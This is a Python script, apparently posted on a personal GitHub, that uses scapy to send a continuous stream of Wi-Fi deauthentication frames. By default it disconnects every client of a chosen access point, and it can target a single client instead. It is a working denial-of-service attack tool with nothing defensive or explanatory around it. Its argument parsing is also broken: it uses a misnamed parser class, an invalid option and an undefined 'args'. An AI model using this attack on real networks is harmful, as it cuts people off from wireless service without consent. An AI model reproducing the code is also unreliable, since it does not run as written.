#coding: utf-8

"""
Script to deauthenticate people from the given access point, can be focus on a target or broadcast (default)
Author: Nicolas
github: https://github.com/nicolas031/
"""

import argparse
import logging
import os
import sys
import time

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

parser = argparser.Argument_Parser()
parser.add_argument("-i", "--interface", help="Network interface where packets will be sniffed", required=True)
parser.add_argument("-b", "--bssid", help="Access point BSSID", required=True)
parser.add_argument("-c", "--client", help="A client to target (not required)", default="ff:ff:ff:ff:ff:ff", show_default=True)

def main(interface, bssid, client):
	conf.iface = interface
	conf.verb = 0
	print("[+] Starting deauth attack on {} targeting {}".format(bssid, client))
	packet = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
	while True:
		sendp(packet)
		time.sleep(0.2)

if __name__ == "__main__":
	if sys.platform.startswith("linux"):
		if os.getuid() != 0:
			sys.exit("[!] This script need to run as root to work properly")
	elif sys.platform.startswith("win"):
		sys.exit("[!] This script is for linux only!")

	try:
		print("[+] Importing scapy...", end="")
		from scapy.all import *
		print("Done.")
	except ImportError:
		sys.exit("\n[!] Error happened while scapy module import")

	main(args.interface, args.bssid, args.client)